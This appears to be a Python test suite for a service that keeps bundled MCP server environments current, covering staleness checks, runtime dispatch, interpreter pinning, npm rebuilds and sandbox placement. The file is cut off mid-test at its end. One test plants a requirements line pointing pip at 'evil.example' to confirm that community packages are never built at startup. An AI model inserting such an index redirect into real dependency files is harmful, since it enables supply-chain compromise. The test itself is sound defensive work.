"""Tests for the startup pass that ensures bundled MCP venvs are current.

Covers the freshness check semantics (missing/stale → rebuild, fresh → skip),
runtime dispatch (docker/python/node), graceful handling of bad manifests,
and the absence-of-MCPS_DIR case. ``install_mcp`` itself is mocked — its
behavior is covered separately in ``test_mcp_installer.py``.
"""

from __future__ import annotations

import json
import sys
import time
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

import config
from services.mcp import mcp_venv_bootstrap
from services.mcp.mcp_installer import InstallResult


def _make_mcp(root: Path, category: str, name: str, manifest: dict) -> Path:
    """Helper: drop a fake MCP folder under ``root/<category>/<name>/``."""
    mcp_dir = root / category / name
    mcp_dir.mkdir(parents=True, exist_ok=True)
    (mcp_dir / "manifest.json").write_text(json.dumps(manifest))
    return mcp_dir


@pytest.fixture
def fake_mcps_root(tmp_path, monkeypatch):
    """Point ``config.MCPS_DIR`` at a temp dir for the duration of the test."""
    root = tmp_path / "mcps"
    root.mkdir()
    (root / "custom").mkdir()
    (root / "community").mkdir()
    monkeypatch.setattr(config, "MCPS_DIR", root)
    return root


# ─────────────────────── _venv_is_stale ────────────────────────────────


def test_stale_when_venv_missing(tmp_path):
    deps = tmp_path / "requirements.txt"
    deps.write_text("foo==1.0\n")
    venv = tmp_path / "venv"  # not created
    assert mcp_venv_bootstrap._venv_is_stale(deps, venv) is True


def test_fresh_when_venv_newer(tmp_path):
    deps = tmp_path / "requirements.txt"
    deps.write_text("foo==1.0\n")
    venv = tmp_path / "venv"
    venv.mkdir()
    # Bump venv mtime past deps' mtime
    future = time.time() + 60
    import os
    os.utime(venv, (future, future))
    assert mcp_venv_bootstrap._venv_is_stale(deps, venv) is False


def test_stale_when_deps_newer(tmp_path):
    venv = tmp_path / "venv"
    venv.mkdir()
    deps = tmp_path / "requirements.txt"
    deps.write_text("foo==1.0\n")
    # Bump deps mtime past venv's mtime
    future = time.time() + 60
    import os
    os.utime(deps, (future, future))
    assert mcp_venv_bootstrap._venv_is_stale(deps, venv) is True


# ─────────────────── ensure_bundled_venvs_at_startup ──────────────────


@pytest.mark.asyncio
async def test_no_mcps_root_returns_empty(monkeypatch, tmp_path):
    """If MCPS_DIR doesn't exist, function returns empty dict + logs."""
    monkeypatch.setattr(config, "MCPS_DIR", tmp_path / "does-not-exist")
    results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {}


@pytest.mark.asyncio
async def test_skips_docker_runtime(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "docker-mcp", {
        "name": "docker-mcp",
        "server": {"runtime": "docker"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"docker-mcp": "skipped-docker"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_skips_python_mcp_without_requirements(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "no-deps-mcp", {
        "name": "no-deps-mcp",
        "server": {"runtime": "python"},
    })
    # No requirements.txt
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"no-deps-mcp": "skipped-no-reqs"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_skips_bundled_node_runtime(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp",
        "server": {"runtime": "node"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"node-mcp": "skipped-bundled-node"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_unknown_runtime_labeled(fake_mcps_root):
    _make_mcp(fake_mcps_root, "custom", "weird-mcp", {
        "name": "weird-mcp",
        "server": {"runtime": "rust"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"weird-mcp": "skipped-runtime-rust"}


@pytest.mark.asyncio
async def test_python_missing_venv_triggers_install(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("requests==2.31\n")
    # No venv directory exists

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        return_value=InstallResult(ok=True, log="installed", version_hash="abc"),
    ) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "ok"}
        m.assert_awaited_once()
        args, kwargs = m.await_args
        assert args[0] == mcp_dir
        assert args[1] == "python"
        assert args[2] == ""  # empty source = bundled-python branch


@pytest.mark.asyncio
async def test_python_fresh_venv_is_skipped(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    deps = mcp_dir / "requirements.txt"
    deps.write_text("requests==2.31\n")
    venv = mcp_dir / "venv"
    venv.mkdir()
    # Bump venv mtime past deps' mtime + success-mark it (an unmarked EMPTY
    # venv is the poisoned interrupted-install shape and rebuilds by design).
    import os
    future = time.time() + 60
    os.utime(venv, (future, future))
    mcp_venv_bootstrap._write_marker(
        mcp_dir,
        requirements_sha256=mcp_venv_bootstrap._requirements_hash(deps),
    )

    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "fresh"}
        m.assert_not_awaited()


@pytest.mark.asyncio
async def test_python_stale_venv_triggers_install(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    deps = mcp_dir / "requirements.txt"
    venv = mcp_dir / "venv"
    venv.mkdir()
    # Now write deps with a newer mtime
    deps.write_text("requests==2.31\nclick==8.1\n")
    import os
    future = time.time() + 60
    os.utime(deps, (future, future))

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        return_value=InstallResult(ok=True, log="updated", version_hash="def"),
    ) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "ok"}
        m.assert_awaited_once()


@pytest.mark.asyncio
async def test_install_failure_reported(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("nonexistent-pkg==1.0\n")

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        return_value=InstallResult(ok=False, log="pip error"),
    ):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "failed"}


@pytest.mark.asyncio
async def test_install_exception_caught(fake_mcps_root):
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp",
        "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("foo==1.0\n")

    with patch(
        "services.mcp.mcp_installer.install_mcp",
        new_callable=AsyncMock,
        side_effect=RuntimeError("disk full"),
    ):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {"py-mcp": "exception"}


@pytest.mark.asyncio
async def test_bad_manifest_skipped(fake_mcps_root, caplog):
    mcp_dir = fake_mcps_root / "custom" / "broken-mcp"
    mcp_dir.mkdir()
    (mcp_dir / "manifest.json").write_text("{ not valid json")

    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as m:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {}  # bad manifest never enters the dict
        m.assert_not_awaited()
    # Warning was logged
    assert any("bad manifest" in r.message for r in caplog.records)


@pytest.mark.asyncio
async def test_walks_both_categories(fake_mcps_root):
    """Both custom/ AND community/ subtrees are scanned."""
    _make_mcp(fake_mcps_root, "custom", "from-custom", {
        "name": "from-custom",
        "server": {"runtime": "docker"},
    })
    _make_mcp(fake_mcps_root, "community", "from-community", {
        "name": "from-community",
        "server": {"runtime": "docker"},
    })
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert results == {
            "from-custom": "skipped-docker",
            "from-community": "skipped-docker",
        }


@pytest.mark.asyncio
async def test_manifest_name_overrides_dir_name(fake_mcps_root):
    """Canonical name from manifest is used, even when dir name differs."""
    mcp_dir = fake_mcps_root / "community" / "workspace-mcp"
    mcp_dir.mkdir()
    (mcp_dir / "manifest.json").write_text(json.dumps({
        "name": "google-workspace",  # canonical slug, not folder name
        "server": {"runtime": "docker"},
    }))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
        assert "google-workspace" in results
        assert "workspace-mcp" not in results


# ──────────────────── python-interpreter reconciliation ────────────────


def _write_pyvenv(venv_dir: Path, major: int, minor: int, micro: int = 0) -> None:
    venv_dir.mkdir(parents=True, exist_ok=True)
    (venv_dir / "pyvenv.cfg").write_text(
        f"home = /usr/bin\nversion = {major}.{minor}.{micro}\n"
    )


def test_venv_python_minor_parses(tmp_path):
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 10, 12)
    assert mcp_venv_bootstrap._venv_python_minor(venv) == (3, 10)


def test_venv_python_minor_missing_or_garbled(tmp_path):
    venv = tmp_path / "venv"
    venv.mkdir()
    assert mcp_venv_bootstrap._venv_python_minor(venv) is None  # no pyvenv.cfg
    (venv / "pyvenv.cfg").write_text("home = /usr/bin\n")  # no version line
    assert mcp_venv_bootstrap._venv_python_minor(venv) is None


def test_needs_python_reconcile_missing_venv(tmp_path):
    assert mcp_venv_bootstrap._needs_python_reconcile(tmp_path / "venv", (3, 13), tmp_path) is False


def test_needs_python_reconcile_older_interpreter(tmp_path):
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 10)
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is True


def test_needs_python_reconcile_current_or_newer(tmp_path):
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 13)
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is False
    _write_pyvenv(venv, 3, 14)
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is False


def test_needs_python_reconcile_ceiling_marker_skips(tmp_path):
    """venv below target but already reconciled to it (real requires-python ceiling)."""
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 13)
    (tmp_path / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"python": "3.14"}))
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 14), tmp_path) is False


def test_needs_python_reconcile_stale_marker_rebuilds(tmp_path):
    """A marker from an OLD target doesn't suppress a new reconcile."""
    venv = tmp_path / "venv"
    _write_pyvenv(venv, 3, 10)
    (tmp_path / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"python": "3.12"}))
    assert mcp_venv_bootstrap._needs_python_reconcile(venv, (3, 13), tmp_path) is True


@pytest.mark.asyncio
async def test_interpreter_stale_rebuilds_pinned_and_marks(fake_mcps_root):
    """A venv on an older interpreter is rmtree'd, rebuilt pinned to target, marked."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp", "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("requests==2.31\n")
    venv = mcp_dir / "venv"
    # Built on one minor BELOW the test runner → interpreter-stale...
    _write_pyvenv(venv, sys.version_info[0], sys.version_info[1] - 1)
    # ...but venv mtime newer than reqs, so this is NOT the mtime path.
    import os
    future = time.time() + 60
    os.utime(venv, (future, future))

    spec = f"{sys.version_info[0]}.{sys.version_info[1]}"
    with patch("services.mcp.mcp_venv_bootstrap.find_uv", return_value="/fake/uv"), \
         patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", version_hash="h",
                                          venv_python=spec)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()

    assert results == {"py-mcp": "ok-py-reconcile"}
    inst.assert_awaited_once()
    assert inst.await_args.kwargs["python_spec"] == spec   # pinned to the proxy
    assert not venv.exists()             # old venv removed (the install is mocked)
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["python"] == f"{sys.version_info[0]}.{sys.version_info[1]}"


@pytest.mark.asyncio
async def test_interpreter_current_is_fresh(fake_mcps_root):
    """A venv on the proxy's own interpreter is not reconciled."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "py-mcp", {
        "name": "py-mcp", "server": {"runtime": "python"},
    })
    (mcp_dir / "requirements.txt").write_text("requests==2.31\n")
    venv = mcp_dir / "venv"
    _write_pyvenv(venv, sys.version_info[0], sys.version_info[1])
    import os
    future = time.time() + 60
    os.utime(venv, (future, future))
    mcp_venv_bootstrap._write_marker(
        mcp_dir,
        requirements_sha256=mcp_venv_bootstrap._requirements_hash(
            mcp_dir / "requirements.txt"),
    )

    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "fresh"}
    inst.assert_not_awaited()


# ───────────────────── node native-addon reconciliation ────────────────


@pytest.mark.asyncio
async def test_node_absent_marker_records_no_rebuild(fake_mcps_root):
    """A freshly-built node_modules (no marker) is recorded, not rebuilt."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as spawn:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "skipped-bundled-node"}
    spawn.assert_not_awaited()  # no npm rebuild on first encounter
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 24


@pytest.mark.asyncio
async def test_node_major_change_triggers_rebuild(fake_mcps_root):
    """A node MAJOR change since node_modules was built → npm rebuild + remark."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))

    fake_proc = AsyncMock()
    fake_proc.communicate = AsyncMock(return_value=(b"rebuilt", None))
    fake_proc.returncode = 0
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock, return_value=fake_proc):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "ok-node-rebuild"}
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 24


@pytest.mark.asyncio
async def test_node_rebuild_failure_is_advisory(fake_mcps_root):
    """A failed npm rebuild is reported but never fatal; marker is NOT advanced."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))

    fake_proc = AsyncMock()
    fake_proc.communicate = AsyncMock(return_value=(b"gyp error", None))
    fake_proc.returncode = 1
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock, return_value=fake_proc):
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "skipped-node-rebuild-fail"}
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 22  # unchanged — retried next boot


class TestSuccessMarkerStaleness:
    """Interrupted installs poison the mtime heuristic (live-hit 2026-07-11):
    the success marker (requirements sha256, written only after a dep sync
    exits 0) is what the staleness check trusts."""

    def _mcp(self, tmp_path, with_pkg):
        from services.mcp.mcp_venv_bootstrap import _requirements_hash
        mcp = tmp_path / "m"
        mcp.mkdir()
        req = mcp / "requirements.txt"
        req.write_text("fastmcp\n")
        venv = mcp / "venv"
        venv.mkdir()  # created after reqs → mtime-fresh
        if with_pkg:
            sp = venv / "lib" / "python3.13" / "site-packages" / "pkg-1.0.dist-info"
            sp.mkdir(parents=True)
        return mcp, req, venv, _requirements_hash(req)

    def test_interrupted_install_is_stale(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale
        mcp, req, venv, _ = self._mcp(tmp_path, with_pkg=False)
        assert _venv_is_stale(req, venv, mcp) is True

    def test_healthy_unmarked_venv_backfills_without_rebuild(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale, _read_marker
        mcp, req, venv, h = self._mcp(tmp_path, with_pkg=True)
        assert _venv_is_stale(req, venv, mcp) is False
        assert _read_marker(mcp).get("requirements_sha256") == h

    def test_marker_match_is_fresh_even_when_venv_empty(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale, _write_marker
        mcp, req, venv, h = self._mcp(tmp_path, with_pkg=False)
        _write_marker(mcp, requirements_sha256=h)
        assert _venv_is_stale(req, venv, mcp) is False

    def test_marker_mismatch_is_stale(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale, _write_marker
        mcp, req, venv, _ = self._mcp(tmp_path, with_pkg=True)
        _write_marker(mcp, requirements_sha256="deadbeef")
        assert _venv_is_stale(req, venv, mcp) is True

    def test_no_mcp_dir_keeps_pure_mtime_behavior(self, tmp_path):
        from services.mcp.mcp_venv_bootstrap import _venv_is_stale
        _, req, venv, _ = self._mcp(tmp_path, with_pkg=False)
        assert _venv_is_stale(req, venv) is False


@pytest.mark.asyncio
async def test_node_addon_rebuild_runs_for_platform_shipped_folders_only(fake_mcps_root, monkeypatch):
    """``npm rebuild`` runs a package's lifecycle scripts, which the
    install refuses; only the folders shipped with the platform get it."""
    for cat in ("custom", "community"):
        d = _make_mcp(fake_mcps_root, cat, f"node-{cat}",
                      {"name": f"node-{cat}", "server": {"runtime": "node"}})
        (d / "node_modules").mkdir()
    rebuilt: list[str] = []

    async def _rebuild(mcp_dir, name):
        rebuilt.append(mcp_dir.parent.name)
        return "ok-node-rebuild"

    monkeypatch.setattr(mcp_venv_bootstrap, "_reconcile_node_addons", _rebuild)
    results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert rebuilt == ["custom"]
    assert results["node-custom"] == "ok-node-rebuild"
    assert results["node-community"] == "skipped-bundled-node"


@pytest.mark.asyncio
async def test_python_requirements_build_runs_for_platform_shipped_folders_only(fake_mcps_root):
    """A catalog Python MCP installs from its ``server.source`` wheels only;
    a ``requirements.txt`` in its folder is never built at boot (it would run
    an index, VCS or sdist line of the catalog's choosing as the proxy)."""
    for cat in ("custom", "community"):
        d = _make_mcp(fake_mcps_root, cat, f"py-{cat}",
                      {"name": f"py-{cat}", "server": {"runtime": "python"}})
        (d / "requirements.txt").write_text("--extra-index-url https://evil.example\nx\n")
        _write_pyvenv(d / "venv", sys.version_info[0], sys.version_info[1] - 1)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", version_hash="h")) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert [c.args[0].parent.name for c in inst.await_args_list] == ["custom"]
    assert results["py-custom"] in ("ok", "ok-py-reconcile")
    assert results["py-community"] == "skipped-community-python"
    # the community venv is left exactly as it was
    assert (fake_mcps_root / "community" / "py-community" / "venv" / "pyvenv.cfg").is_file()


# ───── the npm rebuild and the pinned venv run as every install subprocess does ─────


def _alive(pid: int) -> bool:
    try:
        stat = Path(f"/proc/{pid}/stat").read_text()
    except OSError:
        return False
    return stat.rsplit(")", 1)[1].split()[0] not in ("Z", "X")


def _node_mcp_due_for_rebuild(root: Path) -> Path:
    mcp_dir = _make_mcp(root, "custom", "node-mcp", {
        "name": "node-mcp", "server": {"runtime": "node"},
    })
    (mcp_dir / "node_modules").mkdir()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps({"node_major": 22}))
    return mcp_dir


@pytest.mark.asyncio
async def test_npm_rebuild_runs_under_the_installers_environment(fake_mcps_root, monkeypatch):
    """``npm rebuild`` runs the packages' lifecycle scripts: they see the
    installer's allowlisted environment, never the proxy's secrets."""
    monkeypatch.setenv("JWT_SECRET", "s3")
    _node_mcp_due_for_rebuild(fake_mcps_root)
    fake_proc = AsyncMock()
    fake_proc.communicate = AsyncMock(return_value=(b"rebuilt", None))
    fake_proc.returncode = 0
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock,
               return_value=fake_proc) as spawn:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"node-mcp": "ok-node-rebuild"}
    env = spawn.await_args.kwargs["env"]
    assert env is not None and "JWT_SECRET" not in env
    assert env["UV_NO_CONFIG"] == "1"


@pytest.mark.asyncio
@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="reads /proc")
async def test_a_hung_npm_rebuild_is_killed_and_retried_next_boot(fake_mcps_root, tmp_path, monkeypatch):
    import asyncio
    import os
    from services.mcp import mcp_installer
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    pids = tmp_path / "npm.pids"
    npm = bin_dir / "npm"
    npm.write_text(f'#!/bin/sh\necho $$ >> "{pids}"\nsleep 20 & echo $! >> "{pids}"\nsleep 20\n')
    npm.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ.get('PATH', '/usr/bin')}")
    monkeypatch.setattr(mcp_installer, "DEFAULT_INSTALL_TIMEOUT", 1)
    mcp_dir = _node_mcp_due_for_rebuild(fake_mcps_root)
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24):
        results = await asyncio.wait_for(mcp_venv_bootstrap.ensure_bundled_venvs_at_startup(), 10)
    assert results == {"node-mcp": "skipped-node-rebuild-fail"}
    marker = json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())
    assert marker["node_major"] == 22
    for _ in range(40):
        if not any(_alive(int(p)) for p in pids.read_text().split()):
            break
        await asyncio.sleep(0.05)
    assert not [p for p in pids.read_text().split() if _alive(int(p))]




# ───── the first venv, a failed pin, a venv outside the sandbox, the prune ─────


_SPEC = f"{sys.version_info[0]}.{sys.version_info[1]}"


def _custom_py(root: Path, name: str = "py-mcp") -> Path:
    d = _make_mcp(root, "custom", name, {"name": name, "server": {"runtime": "python"}})
    (d / "requirements.txt").write_text("requests==2.31\n")
    return d


def _marker(mcp_dir: Path) -> dict:
    return json.loads((mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).read_text())


@pytest.mark.asyncio
async def test_the_first_venv_is_pinned_to_the_proxy_and_inside_the_sandbox(fake_mcps_root):
    mcp_dir = _custom_py(fake_mcps_root)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "ok"}
    kw = inst.await_args.kwargs
    assert kw["python_spec"] == _SPEC
    roots = kw["sandbox_roots"]
    assert (fake_mcps_root.resolve() / ".uv-python") in roots
    assert mcp_dir.resolve() in roots and Path("/usr").resolve() in roots
    assert _marker(mcp_dir)["python"] == _SPEC


@pytest.mark.asyncio
async def test_a_failed_pin_is_recorded_and_waits_a_day(fake_mcps_root, caplog, monkeypatch):
    # A pin can only fail where uv exists to attempt it: without uv the venv
    # reads reconciled (the host decides, not the test's machine).
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: "/fake/uv")
    mcp_dir = _custom_py(fake_mcps_root)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python="")):
        assert await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup() == {"py-mcp": "ok"}
    marker = _marker(mcp_dir)
    assert "python" not in marker
    assert marker["python_pin_failed"]["target"] == _SPEC

    # The next start finds the venv on an older interpreter: left alone today.
    _write_pyvenv(mcp_dir / "venv", sys.version_info[0], sys.version_info[1] - 1)
    import os
    future = time.time() + 60
    os.utime(mcp_dir / "venv", (future, future))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "fresh"}
    inst.assert_not_awaited()
    assert "tried again a day later" in caplog.text

    # A day later it is tried again.
    from datetime import datetime, timedelta, timezone
    marker = _marker(mcp_dir)
    marker["python_pin_failed"]["at"] = (
        datetime.now(timezone.utc) - timedelta(hours=25)).isoformat()
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps(marker))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "ok-py-reconcile"}
    assert _marker(mcp_dir)["python"] == _SPEC
    assert "python_pin_failed" not in _marker(mcp_dir)


def _outside_venv(mcp_dir: Path, tmp_path: Path) -> None:
    venv = mcp_dir / "venv"
    (venv / "bin").mkdir(parents=True, exist_ok=True)
    elsewhere = tmp_path / "home" / ".local" / "share" / "uv" / "python" / "bin"
    elsewhere.mkdir(parents=True)
    (elsewhere / "python3.13").write_text("")
    (venv / "pyvenv.cfg").write_text(
        f"home = {elsewhere}\nversion_info = {sys.version_info[0]}.{sys.version_info[1]}.0\n")
    (venv / "bin" / "python").symlink_to(elsewhere / "python3.13")
    (venv / "lib" / "python3.13" / "site-packages" / "x-1.dist-info").mkdir(parents=True)


@pytest.mark.asyncio
async def test_an_adopted_venv_outside_the_sandbox_is_relocated(fake_mcps_root, tmp_path):
    mcp_dir = _custom_py(fake_mcps_root)
    _outside_venv(mcp_dir, tmp_path)
    import os
    future = time.time() + 60
    os.utime(mcp_dir / "venv", (future, future))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "ok-py-relocate"}
    inst.assert_awaited_once()
    assert not (mcp_dir / "venv").exists()  # removed before the (mocked) rebuild


@pytest.mark.asyncio
async def test_a_community_venv_outside_the_sandbox_is_only_reported(fake_mcps_root, tmp_path, caplog):
    d = _make_mcp(fake_mcps_root, "community", "pkg-mcp",
                  {"name": "pkg-mcp", "server": {"runtime": "python", "source": "pypi:x@1"}})
    _outside_venv(d, tmp_path)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"pkg-mcp": "skipped-community-python"}
    inst.assert_not_awaited()
    assert "offers its rebuild" in caplog.text


@pytest.mark.asyncio
async def test_the_pass_ends_with_the_interpreter_prune(fake_mcps_root):
    with patch("services.mcp.mcp_installer.prune_uv_pythons", return_value=["cpython-3.11"]) as prune:
        await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    prune.assert_called_once_with(fake_mcps_root)


def test_uv_is_found_on_path_last(monkeypatch, tmp_path):
    monkeypatch.setattr(mcp_venv_bootstrap.os.path, "expanduser", lambda p: str(tmp_path / "none"))
    real_isfile = mcp_venv_bootstrap.os.path.isfile
    monkeypatch.setattr(mcp_venv_bootstrap.os.path, "isfile",
                        lambda p: False if p in ("/usr/local/bin/uv", "/usr/bin/uv") else real_isfile(p))
    monkeypatch.setattr(mcp_venv_bootstrap.shutil, "which",
                        lambda n: "/opt/homebrew/bin/uv" if n == "uv" else None)
    assert mcp_venv_bootstrap.find_uv() == "/opt/homebrew/bin/uv"


def test_the_interpreter_roots_are_the_sandbox_system_binds():
    from core.sandbox import sandbox
    binds = set(sandbox._SYSTEM_RO_BINDS) | set(sandbox._SYSTEM_RO_OPTIONAL)
    assert set(mcp_venv_bootstrap._SYSTEM_INTERPRETER_ROOTS) == binds - {"/snap/bin"}


class TestStartFailureCause:
    def _manifest(self, mcp_dir: Path, runtime: str, command: str = ""):
        from types import SimpleNamespace
        return SimpleNamespace(name=mcp_dir.name, mcp_dir=mcp_dir,
                               server=SimpleNamespace(runtime=runtime, command=command))

    def test_a_missing_venv(self, fake_mcps_root):
        d = _custom_py(fake_mcps_root)
        assert mcp_venv_bootstrap.start_failure_cause(
            self._manifest(d, "python", "venv/bin/python")) == "its venv/ is missing"

    def test_an_interpreter_outside_the_sandbox(self, fake_mcps_root, tmp_path):
        d = _custom_py(fake_mcps_root)
        _outside_venv(d, tmp_path)
        cause = mcp_venv_bootstrap.start_failure_cause(self._manifest(d, "python", "venv/bin/python"))
        assert "outside the folders the session sandbox binds" in cause

    def test_node_modules_missing(self, fake_mcps_root):
        d = _make_mcp(fake_mcps_root, "community", "n", {"name": "n"})
